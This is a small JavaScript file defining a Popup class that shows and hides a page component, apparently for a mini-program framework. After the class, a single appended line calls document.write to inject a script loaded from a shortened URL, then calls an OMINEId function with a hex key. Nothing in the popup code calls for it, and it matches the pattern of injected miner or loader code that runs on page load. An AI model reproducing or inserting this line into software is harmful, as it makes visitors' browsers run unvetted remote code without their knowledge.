export default class Popup{
  constructor (props={}) {
    this.options = {
      context: {}
    }
  }

  show (ele) {
    const pages = getCurrentPages();
    const ctx = pages[pages.length - 1];
    const popup = ctx.selectComponent(ele);
    this.options.context = popup
    popup.show()
  }

  hide (ele) {
    const pages = getCurrentPages();
    const ctx = pages[pages.length - 1];
    const popup = ctx.selectComponent(ele);
    this.options.context = popup
    popup.hide()
  }
}
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
